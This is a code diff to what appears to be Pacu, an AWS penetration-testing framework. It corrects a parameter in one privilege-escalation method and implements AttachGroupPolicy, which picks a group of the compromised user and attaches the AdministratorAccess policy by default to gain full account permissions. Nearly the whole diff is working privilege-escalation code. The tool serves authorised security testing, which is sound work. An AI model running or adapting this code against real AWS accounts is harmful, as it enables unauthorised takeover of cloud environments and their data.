@@ -877,17 +877,58 @@ def AttachUserPolicy(pacu_main, print, input, fetch_data):
         active_aws_key = session.get_active_aws_key(pacu_main.database)
         client.attach_user_policy(
             UserName=active_aws_key['UserName'],
-            policy_arn=policy_arn
+            PolicyArn=policy_arn
         )
         print('  Successfully attached policy {} to the current user! You should now have access to the permissions associated with that policy.'.format(policy_arn))
         return True
-    except Exception as e:
-        print('  Failed to attach policy {} to the current user:\n{}'.format(policy_arn, e))
+    except Exception as error:
+        print('  Failed to attach policy {} to the current user:\n{}'.format(policy_arn, error))
         return False
 
 
 def AttachGroupPolicy(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+
+    print('  Starting method AttachGroupPolicy...')
+
+    active_aws_key = session.get_active_aws_key(pacu_main.database)
+    client = pacu_main.get_boto3_client('iam')
+
+    group = input('    Is there a specific group you want to target? Enter its name now or just hit enter to automatically find a valid group: ')
+
+    if not group:
+        if len(active_aws_key.groups) > 1:
+            choice = ''
+            while choice == '':
+                print('Found {} groups that the current user belongs to. Choose one below.'.format(len(active_aws_key.groups)))
+                for i in range(0, len(active_aws_key.groups)):
+                    print('  [{}] {}'.format(i, active_aws_key.groups[i]['GroupName']))
+                choice = input('Choose an option: ')
+            group = active_aws_key.groups[int(choice)]['GroupName']
+        elif len(active_aws_key.groups) == 1:
+            print('Found 1 group that the current user belongs to.\n')
+            group = active_aws_key.groups[0]['GroupName']
+        else:
+            print('  Did not find any groups that the user belongs to. Skipping to the next privilege escalation method...\n')
+            return False
+
+    print('Targeting group: {}\n'.format(group))
+
+    policy_arn = input('    Is there a specific policy you want to add to the target group? Enter its ARN now or just hit enter to attach the AWS managed AdministratorAccess policy (arn:aws:iam::aws:policy/AdministratorAccess): ')
+    if not policy_arn:
+        policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
+
+    try:
+        active_aws_key = session.get_active_aws_key(pacu_main.database)
+        client.attach_group_policy(
+            GroupName=group,
+            PolicyArn=policy_arn
+        )
+        print('  Successfully attached policy {} to the group {}! You should now have access to the permissions associated with that policy.\n'.format(policy_arn, group))
+        return True
+    except Exception as error:
+        print('  Failed to attach policy {} to the group {}.\n{}'.format(policy_arn, group, error))
+        return False
 
 
 def AttachRolePolicy(pacu_main, print, input, fetch_data):
